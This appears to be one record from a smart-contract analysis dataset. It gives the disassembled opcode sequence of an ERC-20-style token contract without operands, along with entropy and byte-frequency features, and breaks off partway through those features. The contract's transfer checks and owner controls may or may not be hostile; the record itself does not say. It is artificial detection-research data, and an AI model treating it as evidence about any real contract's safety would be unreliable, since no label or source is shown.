{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 SSTORE JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 SLOAD SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP6 DUP3 DUP6 PUSH2 JUMP JUMPDEST PUSH2 DUP6 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 AND SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP2 DUP6 DUP6 PUSH2 DUP6 DUP10 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 SSTORE JUMP JUMPDEST PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 PUSH2 JUMP JUMPDEST JUMP JUMPDEST PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH1 PUSH2 DUP3 DUP7 PUSH2 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT AND PUSH1 PUSH1 PUSH1 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 DUP1 PUSH2 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP2 DUP6 DUP6 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 SWAP1 SWAP2 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 DUP1 SLOAD PUSH1 NOT AND SWAP2 ISZERO ISZERO SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE SHA3 SLOAD SWAP1 JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST CALLER SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP5 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 SWAP1 SWAP2 MSTORE SWAP1 DUP2 SWAP1 SHA3 DUP5 SWAP1 SSTORE MLOAD PUSH32 SWAP1 PUSH2 SWAP1 DUP6 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH1 NOT DUP2 EQ PUSH2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP2 GT PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND DUP1 PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND JUMPDEST ISZERO PUSH2 JUMPI PUSH2 DUP4 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND SWAP2 AND EQ ISZERO PUSH2 JUMPI PUSH1 PUSH1 PUSH1 SLOAD DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP5 PUSH2 DUP4 PUSH2 JUMP JUMPDEST PUSH2 DUP2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP5 DUP5 DUP5 PUSH2 JUMP JUMPDEST POP PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ ISZERO PUSH2 JUMPI PUSH1 PUSH1 PUSH1 SLOAD DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 DUP4 DUP4 DUP4 PUSH2 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP4 DUP2 AND PUSH1 PUSH1 PUSH1 SHL SUB NOT DUP4 AND DUP2 OR DUP5 SSTORE PUSH1 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 DUP4 SWAP2 PUSH32 SWAP2 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP2 GT PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 DUP4 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP5 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP1 DUP3 SHA3 DUP1 SLOAD DUP7 SWAP1 SUB SWAP1 SSTORE SWAP3 DUP6 AND DUP1 DUP3 MSTORE SWAP1 DUP4 SWAP1 SHA3 DUP1 SLOAD DUP6 ADD SWAP1 SSTORE SWAP2 MLOAD PUSH32 SWAP1 PUSH2 SWAP1 DUP6 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 DUP4 DUP4 DUP4 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP3 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP5 DUP2 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 DUP2 SWAP1 SHA3 SLOAD SWAP1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE SWAP2 SWAP1 SWAP3 AND SWAP2 PUSH4 SWAP2 PUSH2 SWAP2 DUP8 SWAP2 DUP7 SWAP1 PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI DUP1 DUP2 REVERT JUMPDEST PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI DUP1 DUP2 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 PUSH1 DUP5 ADD PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI DUP1 DUP2 REVERT JUMPDEST PUSH2 DUP5 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH2 PUSH1 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI DUP2 DUP3 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP4 ADD CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI DUP2 DUP3 REVERT JUMPDEST PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP5 PUSH1 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI DUP1 DUP2 REVERT JUMPDEST DUP2 MLOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI DUP1 DUP2 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP4 SWAP1 SWAP4 AND DUP4 MSTORE PUSH1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE DUP3 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 ADD MSTORE DUP3 ADD PUSH2 JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 JUMPI DUP4 PUSH1 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 ADD PUSH1 NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 ADD SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH3 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH2 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH3 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE DUP2 DUP2 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH4 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST SWAP1 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 SWAP2 SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 DUP3 NOT DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 DUP3 PUSH2 JUMPI PUSH4 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP2 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 DUP2 PUSH1 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 DUP3 DUP3 LT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST POP SUB SWAP1 JUMP JUMPDEST PUSH1 DUP2 DIV PUSH1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 EQ ISZERO PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST DUP1 ISZERO ISZERO DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 SELFDESTRUCT UNKNOWN_0xf7 UNKNOWN_0xa6 SELFBALANCE UNKNOWN_0xe8 DUP4 UNKNOWN_0x2d UNKNOWN_0x49 BYTE SWAP12 UNKNOWN_0xbf UNKNOWN_0xd8 SWAP3 UNKNOWN_0xee UNKNOWN_0x22 JUMP UNKNOWN_0xc1 UNKNOWN_0x2a UNKNOWN_0xa9 DUP7 INVALID_0x77",
  "opcode_entropy": 4.57627541403065,
  "opcode_count": 2689,
  "unique_opcodes": 76,
  "byte_entropy": 6.047288550301995,
  "byte_0x": 0.00022426553038797938,
  "byte_60": 0.10248934738730657,
  "byte_80": 0.024220677281901772,
  "byte_40": 0.01435299394483068,
  "byte_52": 0.026239067055393587,
  "byte_34": 0.00044853106077595876,
  "byte_15": 0.00717649697241534,
  "byte_61": 0.07916573222695672,
  "byte_00": 0.015025790535994617,
  "byte_10": 0.008746355685131196,
  "byte_57": 0.01771697690065037,
  "byte_fd": 0.004261045077371608,
  "byte_5b": 0.047768557972639604,
  "byte_50": 0.019735366674142184,
  "byte_04": 0.01838977349181431,
  "byte_36": 0.0033639829558196905,
  "byte_01": 0.052478134110787174,
  "byte_73": 0.006055169320475443,
  "byte_35": 0.0013455931823278763,
  "byte_e0": 0.002018389773491814,
  "byte_1c": 0.00022426553038797938,
  "byte_63": 0.009867683337071092,
  "byte_70": 0.002018389773491814,
  "byte_a0": 0.009867683337071092,
  "byte_82": 0.018614039022202288,
  "byte_31": 0.0008970621215519175,
  "byte_11": 0.0038125140165956493,
  "byte_de": 0.0006727965911639381,
  "byte_a6": 0.001121327651939897,
  "byte_22": 0.001794124243103835,
  "byte_0d": 0.004261045077371608,
  "byte_6e": 0.006503700381251401,
  "byte_97": 0.00044853106077595876,
  "byte_c0": 0.0006727965911639381,
  "byte_24": 0.0015698587127158557,
  "byte_66": 0.0026911863646557526,
  "byte_68": 0.0026911863646557526,
  "byte_71": 0.0015698587127158557,
  "byte_14": 0.008970621215519175,
  "byte_02": 0.0076250280331912985,
  "byte_da": 0.00044853106077595876,
  "byte_dd": 0.001121327651939897,
  "byte_62": 0.006279434850863423,
  "byte_ed": 0.0008970621215519175,
  "byte_3e": 0.0008970621215519175,
  "byte_f2": 0.0006727965911639381,
  "byte_e3": 0.0006727965911639381,
  "byte_8b": 0.006279434850863423,
  "byte_03": 0.019062570082978247,
  "byte_f8": 0.0006727965911639381,
  "byte_87": 0.0008970621215519175,
  "byte_ea": 0.00022426553038797938,
  "byte_13": 0.00044853106077595876,
  "byte_56": 0.041264857591388204,
